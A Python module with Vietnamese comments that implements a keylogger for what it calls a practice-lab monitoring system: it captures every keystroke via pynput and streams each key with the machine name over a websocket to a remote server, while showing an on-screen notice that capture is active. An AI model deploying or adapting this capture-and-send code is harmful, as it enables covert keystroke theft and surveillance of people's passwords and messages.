import threading
import json
import tkinter as tk
from pynput import keyboard

# Quản lý trạng thái cục bộ
keylogger_capturing = False
keylogger_listener = None

# Quản lý vòng đời giao diện duy nhất (Singleton GUI)
root_app = None
gui_ready_event = threading.Event()

def init_persistent_gui():
    """Khởi tạo một luồng giao diện duy nhất, chạy ẩn ban đầu"""
    global root_app
    try:
        root_app = tk.Tk()
        root_app.title("HỆ THỐNG PHÒNG LAB THỰC HÀNH CẢNH BÁO")
        root_app.attributes("-topmost", True)
        root_app.geometry("450x150+30+30")
        root_app.configure(bg="#7f1d1d")
        
        # Tiêu đề thông báo
        lbl_title = tk.Label(root_app, text="Bắt phím kiểm tra (Keylogger Demo)", font=("Helvetica", 12, "bold"), fg="white", bg="#7f1d1d")
        lbl_title.pack(pady=10)
        
        # Nội dung cam kết phạm vi
        lbl_desc = tk.Label(
            root_app, 
            text="Chỉ ghi nhận luồng phím trong phạm vi được thông báo công khai.\nHệ thống đang kiểm tra thao tác thực hành cấu hình mạng.",
            font=("Helvetica", 10), fg="#fecdd3", bg="#7f1d1d", justify="center"
        )
        lbl_desc.pack(pady=5)
        
        # Ban đầu ẩn cửa sổ đi, khi nào cần mới hiện
        root_app.withdraw()
        
        # Báo hiệu cho luồng chính biết giao diện đã sẵn sàng
        gui_ready_event.set()
        root_app.mainloop()
    except Exception as e:
        print(f"❌ Không thể khởi tạo nhân đồ họa Tkinter: {e}")

def start_keylogger_module(ws, machine_name):
    """Kích hoạt lắng nghe phím công khai và mở bảng thông báo cho sinh viên"""
    global keylogger_capturing, keylogger_listener, root_app
    
    if keylogger_capturing:
        return
        
    print("⌨️ [KEYLOGGER] Khởi chạy bộ lắng nghe phím thực hành công khai.")
    keylogger_capturing = True
    
    # Kiểm tra và khởi chạy luồng GUI duy nhất nếu chưa có
    if root_app is None:
        gui_ready_event.clear()
        threading.Thread(target=init_persistent_gui, daemon=True).start()
        gui_ready_event.wait(timeout=2) # Chờ tối đa 2s để Tkinter khởi động xong

    # Hiển thị lại cửa sổ bằng cách đẩy lệnh vào hàng đợi an toàn của Tkinter
    if root_app:
        try:
            root_app.after(0, root_app.deiconify)
        except Exception:
            pass
    
    def on_key_press(key):
        global keylogger_capturing
        if not keylogger_capturing:
            return False
            
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = str(key)
                
            payload = {
                "command": "agent_send_key",
                "machine_name": machine_name,
                "key": key_str
            }
            if ws.sock and ws.sock.connected:
                ws.send(json.dumps(payload))
        except Exception as e:
            print(f"❌ Lỗi đẩy ký tự keylog: {e}")

    # Khởi chạy Listener ngầm của pynput
    keylogger_listener = keyboard.Listener(on_press=on_key_press)
    keylogger_listener.start()

def stop_keylogger_module():
    """Dừng bắt phím hoàn toàn và ẩn giao diện thông báo an toàn"""
    global keylogger_capturing, keylogger_listener, root_app
    print("⌨️ [KEYLOGGER] Đình chỉ bộ ghi nhận phím an toàn.")
    
    keylogger_capturing = False
    
    if keylogger_listener:
        try:
            keylogger_listener.stop()
        except Exception:
            pass
        keylogger_listener = None
        
    # Thay vì destroy, ta chỉ ẩn cửa sổ đi bằng thread-safe after
    if root_app:
        try:
            root_app.after(0, root_app.withdraw)
        except Exception:
            pass